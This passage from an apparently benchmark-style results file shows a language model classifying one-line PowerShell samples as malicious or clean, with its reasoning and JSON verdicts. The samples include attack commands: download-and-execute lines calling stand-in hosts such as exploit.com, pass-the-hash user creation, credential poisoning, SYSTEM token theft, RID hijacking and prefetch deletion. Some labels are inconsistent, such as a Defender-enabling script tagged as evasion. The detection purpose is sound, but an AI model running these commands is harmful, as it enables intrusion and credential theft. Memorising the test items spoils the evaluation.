+      ""code_explain"": ""The `net user … /add` command creates a new local account, a classic persistence technique that gives the attacker a foothold for future logons."",
+      ""tag"": ""PERSISTENCE""
+    }
+  ],
+  ""explain"": ""The script performs remote command execution using stolen credentials to add a new user on the target system, which is a clear indicator of malicious activity aimed at establishing persistence and facilitating further compromise."",
+  ""is_malicious"": ""Malicious"",
+  ""tag"": ""PERSISTENCE""
+}",,,"# Natural language intent:
+# Attempts to add a new user ('SMBExec') with the password 'Winter2017' on a remote system using SMBExec.
+
+Invoke-SMBExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Command 'net user SMBExec Winter2017 /add'
+",1691
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0174,Malicious,"We need to produce JSON per schema. Summarize: script downloads and executes remote PowerShell script. Identify evidence: the URL variable, Invoke-Expression with DownloadString. Tags: DOWNLOADER, EXECUTION, OBFUSCATION maybe not, but remote code execution. Classification: Malicious (definitely offensive). Provide explanation. Also include IOCs? URL is http://exploit.com/WinHack64.ps1. Provide evidence array with code segments.
+
+We need fields: summary, evidence (array of objects with code, code_explain, tag), explain, is_malicious, tag (general category). Tag maybe ""DOWNLOADER"" or ""EXECUTION"". Choose one main tag: ""DOWNLOADER"". Provide.
+
+Make sure required fields: summary, is_malicious, explain. evidence optional but we include.
+
+Return JSON.","{
+  ""summary"": ""The script retrieves a PowerShell file from a remote HTTP server and immediately executes it using Invoke-Expression."",
+  ""evidence"": [
+    {
+      ""code"": ""$url = \""http://exploit.com/WinHack64.ps1\"";"",
+      ""code_explain"": ""Defines a hard‑coded HTTP URL pointing to an external script. Use of an unencrypted HTTP endpoint is a strong indicator of malicious downloader behavior."",
+      ""tag"": ""DOWNLOADER""
+    },
+    {
+      ""code"": ""Invoke-Expression (New-Object System.Net.WebClient).DownloadString($url)"",
+      ""code_explain"": ""Creates a WebClient object, downloads the raw script text from the remote URL, and passes it to Invoke-Expression, which executes the downloaded code in the current session. This pattern provides remote code execution and is a classic technique for delivering payloads."",
+      ""tag"": ""EXECUTION""
+    }
+  ],
+  ""explain"": ""The script performs a classic PowerShell downloader pattern: it fetches a script from an external HTTP address and runs it without any validation or sandboxing. This behavior is characteristic of malicious activity, enabling an attacker to execute arbitrary code on the victim host."",
+  ""is_malicious"": ""Malicious"",
+  ""tag"": ""DOWNLOADER""
+}",,,"# Natural language intent:
+# Downloads and executes a PowerShell script from a specified URL.
+
+$url = ""http://exploit.com/WinHack64.ps1""; Invoke-Expression (New-Object System.Net.WebClient).DownloadString($url)
+",1514
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0172,Malicious,"We need to analyze the given PowerShell script:
+
+```
+Remove-Item -Path (Join-Path ""$Env:SystemRoot\prefetch"" (Get-ChildItem -Path ""$Env:SystemRoot\prefetch*.pf"" -Name)[0])
+```
+
+Goal: Summarize, identify suspicious indicators, decode (none), attribute tags, evidence, iocs, classification.
+
+The script removes an item (file) from the prefetch directory. It joins the system root prefetched path with the first .pf file found (Get-ChildItem ... -Name returns array of filenames matching pattern). Then Remove-Item deletes it.
+
+Potential malicious behavior: Deleting prefetch files is a known defense evasion technique to hide execution artifacts. Prefetch files are used by Windows to speed up loading of executables and also for forensic evidence. Deleting them can hinder detection. So this is a defensive evasion / cleanup.
+
+Thus classification: Malicious (defense evasion). Could be used by legitimate admin script to clean prefetch, but typical malicious usage is to hide traces. So we label as Malicious with tag DEFENSE_EVASION.
+
+Evidence: code segment is the Remove-Item command.
+
+Tag: DEFENSE_EVASION (or maybe ""CLEANUP"" but not in list; use DEFENSE_EVASION). Also could be ""PERSISTENCE""? No. So tag: DEFENSE_EVASION.
+
+Explain: The script deletes a prefetch file, which is a known artifact used for forensic analysis; removing it is suspicious.
+
+No IOCs like URLs.
+
+Return JSON with required fields: summary, evidence (array), explain, is_malicious, tag.
+
+We need to include evidence items with code, code_explain, tag.
+
+Let's craft.
+
+","{
+  ""summary"": ""The script deletes the first .pf prefetch file found in the Windows Prefetch directory."",
+  ""evidence"": [
+    {
+      ""code"": ""Remove-Item -Path (Join-Path \""$Env:SystemRoot\\prefetch\"" (Get-ChildItem -Path \""$Env:SystemRoot\\prefetch*.pf\"" -Name)[0])"",
+      ""code_explain"": ""The command builds a full path to a .pf file in %SystemRoot%\\Prefetch using Join-Path and Get-ChildItem, then calls Remove-Item to delete that file. Deleting prefetch files is a known technique to erase execution traces and hinder forensic analysis, which is characteristic of defense‑evasion behavior."",
+      ""tag"": ""DEFENSE_EVASION""
+    }
+  ],
+  ""explain"": ""Removing prefetch files provides no functional benefit to normal system operation and is commonly used by malware to hide its execution history, so the script exhibits clear defense‑evasion intent."",
+  ""is_malicious"": ""Malicious"",
+  ""tag"": ""DEFENSE_EVASION""
+}",,,"# Natural language intent:
+# Removes an item specified by the path after joining with the result of a command that retrieves the first item in the prefetch directory.
+
+Remove-Item -Path (Join-Path ""$Env:SystemRoot\prefetch"" (Get-ChildItem -Path ""$Env:SystemRoot\prefetch*.pf"" -Name)[0])
+",1677
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0179,Malicious,"We need to produce JSON per schema. The script is a simple command invoking Inveigh, a PowerShell tool for LLMNR/NBT-NS poisoning and SMB relay, used for network discovery and credential capture. This is malicious/offensive. Identify evidence: the command itself. Tag: LATERAL_MOVEMENT? Actually Inveigh is for credential harvesting (CREDENTIAL_ACCESS) and DISCOVERY. Also DEFENSE_EVASION maybe. Provide summary, evidence array with code, explanation, tag. is_malicious: Malicious. tag: CREDENTIAL_ACCESS or LATERAL_MOVEMENT? Choose ""CREDENTIAL_ACCESS"". Provide explain.","{
+  ""summary"": ""The script runs the Inveigh PowerShell module to launch network‑based attacks (LLMNR/NBT‑NS poisoning, SMB relay) against the specified IP address."",
+  ""evidence"": [
+    {
+      ""code"": ""Invoke-Inveigh -IP 192.168.1.10 -HTTP N"",
+      ""code_explain"": ""Invoke‑Inveigh is a known offensive PowerShell tool that performs LLMNR/NBT‑NS poisoning, SMB relay, and HTTP/HTTPS spoofing. Running it against a target IP initiates credential‑harvesting attacks and can be used for lateral movement. The presence of this command indicates active exploitation rather than benign administration."",
+      ""tag"": ""CREDENTIAL_ACCESS""
+    }
+  ],
+  ""explain"": ""The use of the Inveigh module is a clear indicator of malicious intent, as it is designed to capture NTLM hashes and other credentials from network traffic. The script does not contain any defensive or legitimate functionality beyond launching this attack tool."",
+  ""is_malicious"": ""Malicious"",
+  ""tag"": ""CREDENTIAL_ACCESS""
+}",,,"# Natural language intent:
+# Invokes Inveigh with specified parameters, potentially for network discovery and interception.
+
+Invoke-Inveigh -IP 192.168.1.10 -HTTP N
+",1422
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0229,Clean,"We need to produce JSON per schema. The script is just `$env:username`. That's benign, just reads env var. No malicious behavior. So summary: script outputs current username. Evidence: none. Explain: no malicious indicators. is_malicious: Clean. tag maybe ""EXECUTION""? But if Clean, tag maybe omitted? Schema requires tag property optional? It is defined but not required. We can include null or omit. Provide empty array for evidence. Provide summary, explain, is_malicious, maybe tag omitted. Let's craft.
+
+","{
+  ""summary"": ""The script simply reads and outputs the current user's username from the environment variables."",
+  ""evidence"": [],
+  ""explain"": ""The code only accesses the $env:username variable, which is a standard, non‑malicious operation. No remote execution, credential harvesting, persistence, obfuscation, or other suspicious behavior is present."",
+  ""is_malicious"": ""Clean""
+}",,,"# Natural language intent:
+# Retrieves the current username from the environment variables.
+
+$env:username
+",1237
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0196,Malicious,"We need to produce JSON per schema. Summarize: script runs malicious script with bypass etc. Identify evidence: the command line with ExecutionPolicy Bypass, Hidden window, etc. Tags: EXECUTION, DEFENSE_EVASION (bypass), PERSISTENCE maybe not. It's a command line, not script content, but still malicious. Provide evidence array with code segment and explanation. Determine is_malicious: Malicious. Tag: EXECUTION or DEFENSE_EVASION? Probably ""EXECUTION"". Provide explain.","{
+  ""summary"": ""The command launches a PowerShell script (C:\\MaliciousScript.ps1) while bypassing execution policy, hiding the window, and running without a profile."",
+  ""evidence"": [
+    {
+      ""code"": ""powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -WindowStyle Hidden -NoProfile -File \""C:\\MaliciousScript.ps1\"""",
+      ""code_explain"": ""The command uses -ExecutionPolicy Bypass to override the system's PowerShell execution policy, a common defense‑evasion technique. -WindowStyle Hidden and -NoLogo/-NonInteractive hide any UI, allowing the script to run silently. -NoProfile prevents loading of user profiles that might contain detection hooks. Together these flags indicate an attempt to execute code covertly."",
+      ""tag"": ""DEFENSE_EVASION""
+    },
+    {
+      ""code"": ""-File \""C:\\MaliciousScript.ps1\"""",
+      ""code_explain"": ""Specifies an external script file to run. The path points to a known malicious script, indicating direct execution of potentially harmful code."",
+      ""tag"": ""EXECUTION""
+    }
+  ],
+  ""explain"": ""The use of ExecutionPolicy Bypass, hidden window, and no‑profile options demonstrates intentional evasion of security controls to run a script located at a suspicious path, which is characteristic of malicious behavior."",
+  ""is_malicious"": ""Malicious"",
+  ""tag"": ""EXECUTION""
+}",,,"# Natural language intent:
+# Executes a malicious PowerShell script located at ""C:\MaliciousScript.ps1"" with specific execution policies and settings.
+
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -WindowStyle Hidden -NoProfile -File ""C:\MaliciousScript.ps1""
+",1493
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0225,Clean,"We need to analyze the provided PowerShell content. It's a command: Get-IndexedItem -Filter Contains(,'Stingray'), kind = 'picture', keywords='pin'
+
+We need to see if malicious. This appears to be a legitimate cmdlet maybe from Windows Search or some module. It's just retrieving indexed items with filter. No suspicious behavior. No remote execution, no download, no credential access. So classification: Clean or maybe Not really malicious. According to categories, it's likely benign. So is_malicious = Clean. Provide summary, evidence empty array, explain why not malicious.
+
+Return JSON with required fields. Provide summary: ""Retrieves indexed items (pictures) containing the keyword 'Stingray' and 'pin'."" Provide explain: ""The script only performs a local query using Get-IndexedItem; no network, no persistence, no obfuscation, etc.""
+
+Tag maybe ""DISCOVERY""? But if Clean, tag maybe null or omitted. The schema expects tag property optional? It is defined but not required. We can include tag as ""DISCOVERY"" but classification Clean. The spec says tag classifying general category of the script if it is malicious. Since not malicious, maybe omit or set null. We'll omit.
+
+Provide evidence empty array.
+
+Return JSON.","{
+  ""summary"": ""Runs a local query to retrieve picture items from the index that contain the keyword \""Stingray\"" and have the keyword \""pin\""."",
+  ""evidence"": [],
+  ""explain"": ""The command only uses the built‑in Get‑IndexedItem cmdlet to perform a local search. It does not contact remote hosts, download or execute code, access credentials, modify the system, or employ any obfuscation techniques. Therefore it shows no malicious or offensive behavior."",
+  ""is_malicious"": ""Clean""
+}",,,"# Natural language intent:
+# Gets indexed items with specific filtering conditions and keywords.
+
+Get-IndexedItem -Filter Contains(,'Stingray'), kind = 'picture', keywords='pin'
+",1432
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0231,Malicious,"We need to produce JSON per schema. The script is a PowerShell command: Get-System -ServiceName 'PrivescSvc' -PipeName 'secret'
+
+We need to analyze. This appears to be a custom function Get-System that likely attempts privilege escalation via a service and named pipe. This is suspicious. However we don't have definition of Get-System; could be benign internal tool. But the intent is privilege escalation. So tag: PRIVILEGE_ESCALATION. Evidence: the command uses Get-System with ServiceName and PipeName parameters, indicating attempt to obtain system-level privileges.
+
+We need summary, evidence array, explain, is_malicious classification, tag.
+
+Given limited code, we can classify as Likely malicious because it's attempting privilege escalation, but without seeing implementation we can't be certain. So Likely.
+
+Tag: PRIVILEGE_ESCALATION.
+
+Provide evidence with code snippet.
+
+Return JSON.","{
+  ""summary"": ""The script invokes a custom Get-System function with a service and pipe name, indicating an attempt to acquire system‑level privileges."",
+  ""evidence"": [
+    {
+      ""code"": ""Get-System -ServiceName 'PrivescSvc' -PipeName 'secret'"",
+      ""code_explain"": ""The command calls a function named Get-System and supplies a service name and a named‑pipe identifier. Such parameters are typical of techniques that exploit vulnerable services or named‑pipe impersonation to elevate the current process to SYSTEM. The presence of explicit service and pipe names strongly suggests privilege‑escalation behavior."",
+      ""tag"": ""PRIVILEGE_ESCALATION""
+    }
+  ],
+  ""explain"": ""The only observable behavior is a call to a function that appears designed to elevate privileges via a service and named pipe. While the actual implementation is not shown, the intent aligns with known privilege‑escalation tactics, making the script suspicious."",
+  ""is_malicious"": ""Likely"",
+  ""tag"": ""PRIVILEGE_ESCALATION""
+}",,,"# Natural language intent:
+# Attempts to obtain system-level privileges using specific service and pipe names.
+
+Get-System -ServiceName 'PrivescSvc' -PipeName 'secret'
+",1465
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0233,Clean,"We need to analyze the provided PowerShell content. It's a simple script to create a Hyper-V VM, disable secure boot, start it. No malicious indicators. It's benign admin task. So classification Clean. Provide summary, evidence (maybe none). But need to include evidence array possibly empty. Provide explain. Tag maybe ""EXECUTION"" but since clean, tag maybe null or omitted. According to schema, tag is optional? It is defined but not required. Provide maybe ""NONE"". Provide is_malicious ""Clean"". Provide summary. Provide empty evidence array.","{
+  ""summary"": ""The script creates a Hyper‑V virtual machine with the specified name, sets it to Generation 2, disables Secure Boot, and then starts the VM."",
+  ""evidence"": [],
+  ""explain"": ""The commands used (New‑VM, Set‑VMFirmware, Start‑VM) are standard Hyper‑V administration cmdlets. There is no remote execution, credential harvesting, persistence, obfuscation, downloader behavior, or any other technique associated with malicious activity. The script performs a straightforward, legitimate VM provisioning task."",
+  ""is_malicious"": ""Clean"",
+  ""tag"": null
+}",,,"# Natural language intent:
+# Create a new Hyper-V virtual machine named ${vm_name} with Generation 2, disable Secure Boot in its firmware settings, and start the virtual machine.
+
+$VM = ""${vm_name}"" ; New-VM -Name $VM -Generation 2 ; Set-VMFirmware $VM -EnableSecureBoot Off ; Start-VM $VM
+",1335
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0250,Clean,"We need to produce JSON per schema. The script sets Windows Defender preferences. This is benign, maybe defensive. No malicious indicators. So classification Clean. Provide summary, evidence maybe none. But evidence array can be empty. Provide explain. Tag maybe ""DEFENSE_EVASION""? No, it's not evasion. It's legitimate. So tag maybe null or omitted. Schema requires properties: summary, evidence, explain, is_malicious, tag (optional?). Tag is required? In schema, tag is defined but not required. Only required fields: summary, is_malicious, explain. So we can omit tag or set null. Provide empty evidence array.
+
+Let's craft.","{
+  ""summary"": ""The script configures Windows Defender settings by enabling real‑time monitoring, behavior monitoring, script scanning, and automatic sample submission."",
+  ""evidence"": [],
+  ""explain"": ""All commands are legitimate Windows Defender configuration cmdlets (Set‑MpPreference) that adjust security preferences. No remote execution, credential access, persistence, obfuscation, or other malicious behaviors are present."",
+  ""is_malicious"": ""Clean"",
+  ""tag"": ""DEFENSE_EVASION""
+}",,,"# Natural language intent:
+# Enable various Windows Defender preferences, including runtime scanning and automatic sample submission.
+
+Set-MpPreference -drtm $True ; Set-MpPreference -dbm $True ; Set-MpPreference -dscrptsc $True ; Set-MpPreference -dbaf $True
+",1324
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0278,Clean,"We need to analyze the provided PowerShell content. It's a simple script that creates a new TCP client connection to a specified IP address. No obfuscation, no malicious behavior indicated. It's just establishing a TCP connection. Could be benign or used for legitimate purposes. No evidence of malicious activity like data exfiltration, command execution, etc. So classification likely ""Clean"" or ""Notreally"". According to guidelines, if no malicious indicators, classify as Clean. Provide summary, evidence (maybe none). But evidence array can be empty. Provide explain and is_malicious = ""Clean"". Tag maybe ""EXECUTION"" or none. Since clean, tag maybe omitted or null. But schema requires tag property? Not required. Only required fields: summary, is_malicious, explain. So we can omit tag and evidence optional. Provide empty evidence array.
+
+Let's craft JSON.","{
+  ""summary"": ""The script creates a new TCP client object to connect to a specified IP address."",
+  ""evidence"": [],
+  ""explain"": ""The code only instantiates a System.Net.Sockets.TCPClient with a user‑provided IP address. It contains no obfuscation, no remote command execution, no credential handling, persistence, or other typical malicious behaviors. By itself it is a benign network‑connection operation."",
+  ""is_malicious"": ""Clean""
+}",,,"# Natural language intent:
+# Create a new TCP client connection to the specified IP address.
+
+$client = New-Object System.Net.Sockets.TCPClient(""<IP address>"")
+",1334
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0265,Malicious,"We need to analyze the provided PowerShell content. It's a command: Invoke-MS16135 -Command ""iex(New-Object Net.WebClient).DownloadString('http://google.com')""
+
+We need to produce JSON with summary, evidence array, explain, is_malicious, tag.
+
+We need to identify suspicious segments: use of Invoke-MS16135 (likely a custom function to exploit MS16-135 vulnerability), using iex (Invoke-Expression) to execute downloaded string from a URL (http://google.com). This is downloader, remote code execution, execution, possibly defense evasion. It's malicious.
+
+Provide evidence: code segment ""Invoke-MS16135 -Command ..."" and inner ""iex(New-Object Net.WebClient).DownloadString('http://google.com')"" with tags: DOWNLOADER, EXECUTION, REMOTE_COMMAND_EXECUTION maybe.
+
+Explain: It downloads and executes arbitrary code from remote URL, uses iex to execute, uses Net.WebClient, etc.
+
+Tag overall: DOWNLOADER or EXECUTION.
+
+is_malicious: Malicious.
+
+Provide summary: script attempts to exploit MS16-135 to download and execute payload from remote URL.
+
+Now produce JSON. Ensure required fields: summary, is_malicious, explain. evidence optional but we include.
+
+Let's craft.","{
+  ""summary"": ""The command attempts to exploit the MS16-135 vulnerability to download a script from a remote URL and execute it on the host."",
+  ""evidence"": [
+    {
+      ""code"": ""Invoke-MS16135 -Command \""iex(New-Object Net.WebClient).DownloadString('http://google.com')\"""",
+      ""code_explain"": ""Calls a custom function (Invoke‑MS16135) that likely triggers the MS16‑135 privilege‑escalation exploit. The –Command argument passes a string that is executed via iex, which creates a Net.WebClient object, downloads the raw content from http://google.com, and immediately runs it. This is classic downloader behavior combined with remote code execution."",
+      ""tag"": ""DOWNLOADER""
+    },
+    {
+      ""code"": ""iex(New-Object Net.WebClient).DownloadString('http://google.com')"",
+      ""code_explain"": ""Uses Invoke‑Expression (iex) to execute whatever text is returned by DownloadString. DownloadString fetches data over HTTP without validation, allowing an attacker to supply arbitrary PowerShell code. This pattern is a well‑known technique for remote command execution and execution of untrusted payloads."",
+      ""tag"": ""REMOTE_COMMAND_EXECUTION""
+    }
+  ],
+  ""explain"": ""The script combines a known Windows privilege‑escalation exploit (MS16‑135) with a downloader that fetches and runs code from an external server. The use of iex to execute downloaded content is a clear indicator of malicious intent, providing both execution and potential persistence capabilities."",
+  ""is_malicious"": ""Malicious"",
+  ""tag"": ""DOWNLOADER""
+}",,,"# Natural language intent:
+# Invoke MS16-135 vulnerability to download and execute a payload from a specified URL.
+
+Invoke-MS16135 -Command ""iex(New-Object Net.WebClient).DownloadString('http://google.com')""
+",1676
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0254,Malicious,"We need to produce JSON with fields summary, evidence array, explain, is_malicious, tag. Analyze script: powershell.exe -nop -exec bypass -c ""IEX (New-Object Net.WebClient).DownloadString('http://exploitingurl.com/exeKern32.ps1')""
+
+This is a downloader: uses -nop (no profile), -exec bypass (bypass execution policy), IEX (Invoke-Expression) to execute downloaded script from URL. This is malicious behavior: remote code execution, downloader, execution, defense evasion (execution policy bypass), obfuscation maybe not but still suspicious.
+
+Provide evidence: code segment: ""IEX (New-Object Net.WebClient).DownloadString('http://exploitingurl.com/exeKern32.ps1')"" tag: DOWNLOADER or EXECUTION. Also the flags -nop -exec bypass tag: DEFENSE_EVASION.
+
+Provide summary: script downloads and runs remote PowerShell script.
+
+Explain: malicious because it fetches and executes code from external URL, bypasses execution policy, etc.
+
+Tag: DOWNLOADER or EXECUTION. Choose general category: DOWNLOADER.
+
+is_malicious: Malicious.
+
+Now produce JSON. Ensure required fields: summary, is_malicious, explain. evidence array can be empty? Should include items. Provide required fields.
+
+Let's craft.","{
+  ""summary"": ""The command launches PowerShell with no profile and execution‑policy bypass, then downloads a script from http://exploitingurl.com/exeKern32.ps1 and executes it inline."",
+  ""evidence"": [
+    {
+      ""code"": ""powershell.exe -nop -exec bypass -c \""IEX (New-Object Net.WebClient).DownloadString('http://exploitingurl.com/exeKern32.ps1')\"""",
+      ""code_explain"": ""The flags `-nop` (no profile) and `-exec bypass` suppress user profile loading and bypass the PowerShell execution policy, a common defense‑evasion technique. The payload uses `IEX (New-Object Net.WebClient).DownloadString(...)` to fetch a script from a remote URL and immediately execute it, which is a classic downloader behavior that enables remote code execution."",
+      ""tag"": ""DOWNLOADER""
+    },
+    {
+      ""code"": ""-exec bypass"",
+      ""code_explain"": ""Specifies the `Bypass` execution policy, allowing the script to run even if the system’s policy would block it. This is a direct attempt to evade built‑in PowerShell defenses."",
+      ""tag"": ""DEFENSE_EVASION""
+    },
+    {
+      ""code"": ""IEX (New-Object Net.WebClient).DownloadString('http://exploitingurl.com/exeKern32.ps1')"",
+      ""code_explain"": ""`IEX` (Invoke‑Expression) evaluates the downloaded string as PowerShell code, providing remote command execution without writing the payload to disk, a technique often used by malware to stay stealthy."",
+      ""tag"": ""EXECUTION""
+    }
+  ],
+  ""explain"": ""The command downloads and runs code from an external server while bypassing PowerShell’s execution policy, which is a well‑known malicious pattern for initial compromise and further payload delivery."",
+  ""is_malicious"": ""Malicious"",
+  ""tag"": ""DOWNLOADER""
+}",,,"# Natural language intent:
+# Execute PowerShell with specific settings to download and execute a script from a specified URL.
+
+powershell.exe -nop -exec bypass -c ""IEX (New-Object Net.WebClient).DownloadString('http://exploitingurl.com/exeKern32.ps1')""
+",1785
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0290,Clean,"We need to produce JSON per schema. The script is just Compress-Archive with variables. No malicious behavior. So classification Clean. Provide summary, evidence empty array, explain it's benign. Tag maybe ""EXECUTION"" but not needed if clean. The schema requires properties: summary, is_malicious, explain, optionally evidence, tag. evidence can be empty array. Provide tag maybe null? Not required. Provide tag maybe ""EXECUTION"". But tag property defined as string, not required. Could include. Provide minimal.
+
+Let's craft.","{
+  ""summary"": ""The script uses the built‑in Compress-Archive cmdlet to create a ZIP archive from the specified input file(s) and write it to the given destination, overwriting any existing file."",
+  ""evidence"": [],
+  ""explain"": ""Compress-Archive is a legitimate PowerShell command for archiving files. The script contains no remote calls, credential handling, persistence mechanisms, obfuscation, or any other behavior associated with malicious activity."",
+  ""is_malicious"": ""Clean"",
+  ""tag"": ""EXECUTION""
+}",,,"# Natural language intent:
+# Compress the specified input files into a new archive at the specified destination with forced compression.
+
+Compress-Archive -Path ${input_file} -DestinationPath ${output_file} -Force
+",1282
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0279,Malicious,"We need to produce JSON per schema. Analyze script: It uses Get-Process wininit | Invoke-TokenManipulation -CreateProcess 'cmd.exe' -PassThru).WaitForExit()
+
+Invoke-TokenManipulation is likely a function from PowerSploit or similar that manipulates tokens to spawn a process with elevated privileges (token stealing). This is a privilege escalation technique. It creates a new process (cmd.exe) using token of wininit (system). That's malicious behavior: privilege escalation, execution, possibly persistence if used later. So classification: Malicious.
+
+Evidence: code segment: ""(Get-Process wininit | Invoke-TokenManipulation -CreateProcess 'cmd.exe' -PassThru).WaitForExit()"". Tag: PRIVILEGE_ESCALATION, EXECUTION, DEFENSE_EVASION maybe. Provide explanation.
+
+No IOCs. Summary: script attempts to spawn cmd.exe with system token via wininit process.
+
+Explain: uses token manipulation to bypass UAC, run as SYSTEM.
+
+Return JSON with fields: summary, evidence array, explain, is_malicious, tag (maybe ""PRIVILEGE_ESCALATION"").
+
+Make sure required fields: summary, is_malicious, explain. evidence optional but include.
+
+Proceed.","{
+  ""summary"": ""The script spawns a new cmd.exe process using the token of the privileged wininit process, then waits for that process to finish."",
+  ""evidence"": [
+    {
+      ""code"": ""(Get-Process wininit | Invoke-TokenManipulation -CreateProcess 'cmd.exe' -PassThru).WaitForExit()"",
+      ""code_explain"": ""The command enumerates the wininit process (a SYSTEM‑level service) and pipes it to the Invoke-TokenManipulation function (from PowerSploit/Empire). This function steals the wininit token and creates a new process (cmd.exe) with that token, effectively launching a command shell with SYSTEM privileges. The .WaitForExit() call blocks until the spawned shell exits. Token stealing and launching a high‑privilege process are classic privilege‑escalation and execution techniques used by attackers."",
+      ""tag"": ""PRIVILEGE_ESCALATION""
+    }
+  ],
+  ""explain"": ""The use of Invoke-TokenManipulation to create a SYSTEM‑level cmd.exe process is a clear indicator of privilege escalation and unauthorized command execution, which are malicious behaviors."",
+  ""is_malicious"": ""Malicious"",
+  ""tag"": ""PRIVILEGE_ESCALATION""
+}",,,"# Natural language intent:
+# Create a new process for 'cmd.exe' using token manipulation on the wininit process and wait for the process to exit.
+
+(Get-Process wininit | Invoke-TokenManipulation -CreateProcess 'cmd.exe' -PassThru).WaitForExit()
+",1597
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0286,Malicious,"We need to produce JSON per schema. The script is just a command line invoking powershell.exe with ExecutionPolicy Bypass, NoProfile, -File badProject.ps1. This is a typical execution of a script, but the content of badProject.ps1 is unknown. The provided content is just the command line. There's no malicious code visible. However, using ExecutionPolicy Bypass can be considered suspicious, but it's a common technique for attackers to bypass policy. However, without seeing the script, we cannot label as malicious. According to guidelines, we need to classify based on observable behavior. The command line itself is not malicious; it's just launching a script. Could be considered ""Likely"" because bypass indicates possible malicious intent, but we lack evidence. The instruction says if at least one malicious indicator present, classify as Malicious or Likely. ExecutionPolicy Bypass is a known evasion technique. So we can tag as DEFENSE_EVASION, OBFUSCATION maybe. Provide evidence: the -ExecutionPolicy Bypass flag. Provide explanation. Tag: DEFENSE_EVASION. Overall classification: Likely (since we don't know script content). Provide summary: The command runs a PowerShell script with bypass. Provide explain: The use of ExecutionPolicy Bypass indicates attempt to evade policy, but no further malicious code is visible. Tag: DEFENSE_EVASION. Provide evidence array with one item.
+
+Now produce JSON.","{
+  ""summary"": ""The command launches a PowerShell script (badProject.ps1) while bypassing the system's execution policy and without loading a user profile."",
+  ""evidence"": [
+    {
+      ""code"": ""powershell.exe -ExecutionPolicy Bypass -NoProfile -File <badProject.ps1>"",
+      ""code_explain"": ""The '-ExecutionPolicy Bypass' flag disables the configured PowerShell execution policy, allowing scripts to run even if they are blocked by policy. This is a common technique used to evade defenses and execute potentially malicious code. '-NoProfile' prevents loading of user profiles, reducing the chance of detection through profile scripts."",
+      ""tag"": ""DEFENSE_EVASION""
+    }
+  ],
+  ""explain"": ""The only observable behavior is the use of ExecutionPolicy Bypass, which is a known evasion technique. No malicious payload or further actions are visible in the provided content, so the script cannot be definitively classified as malicious."",
+  ""is_malicious"": ""Likely"",
+  ""tag"": ""DEFENSE_EVASION""
+}",,,"# Natural language intent:
+# Execute a PowerShell script named 'badProject.ps1' with specific execution settings.
+
+powershell.exe -ExecutionPolicy Bypass -NoProfile -File <badProject.ps1>
+",1574
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0302,Clean,"We need to analyze the provided PowerShell content: ""cscript ${vbScript}"". This is a command line invoking cscript with a variable placeholder. It's a simple command to execute a VBScript. No obvious malicious indicators. It's just executing a script; could be benign. No obfuscation, no network, no persistence, etc. So classification: likely Clean. Provide summary, evidence (maybe none). Since no suspicious code, evidence array empty. Explain it's benign. Tag maybe ""EXECUTION"" but not malicious. According to schema, evidence items optional? The required fields are summary, is_malicious, explain. Tag optional. Provide is_malicious ""Clean"". Provide explain: The script simply calls cscript to run a VBScript; no malicious behavior observed. Provide empty evidence array. Provide tag maybe ""EXECUTION"". Let's output JSON.","{
+  ""summary"": ""The script invokes the Windows cscript interpreter to run a VBScript file referenced by the variable ${vbScript}."",
+  ""evidence"": [],
+  ""explain"": ""The command only launches a local VBScript via cscript without any indication of downloading code, accessing credentials, persisting, or evading defenses. No obfuscation, network activity, or privileged actions are present, so the content appears benign."",
+  ""is_malicious"": ""Clean"",
+  ""tag"": ""EXECUTION""
+}",,,"# Natural language intent:
+# Execute a VBScript using the cscript interpreter.
+
+cscript ${vbScript}
+",1325
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0299,Malicious,"We need to analyze the provided PowerShell content. The content is:
+
+```
+# Natural language intent:
+# Perform RID Hijacking to impersonate the specified user (David) with the specified RID, password, and enable the impersonation.
+
+Invoke-RIDHijacking -User David -RID 500 -Password Password1 -Enable
+```
+
+We need to produce JSON with summary, evidence, explain, is_malicious, tag.
+
+We must identify suspicious behavior: RID hijacking is a privilege escalation technique (manipulating RID to impersonate a privileged account). The command uses a function Invoke-RIDHijacking which is not built-in; likely custom malicious function. This is definitely privilege escalation / credential access / defense evasion.
+
+Thus classification: Malicious.
+
+Provide evidence: the command line.
+
+Tag: PRIVILEGE_ESCALATION (maybe also CREDENTIAL_ACCESS). Choose primary tag: PRIVILEGE_ESCALATION.
+
+Provide summary: script attempts to hijack a RID to impersonate built-in Administrator (RID 500) using supplied password.
+
+Explain: The command calls a custom function that likely manipulates SAM or token to impersonate user, which is malicious.
+
+No other code.
+
+Return JSON.
+
+","{
+  ""summary"": ""The script invokes a custom `Invoke-RIDHijacking` function to impersonate the built‑in Administrator account (RID 500) using a supplied password, which is a classic privilege‑escalation technique."",
+  ""evidence"": [
+    {
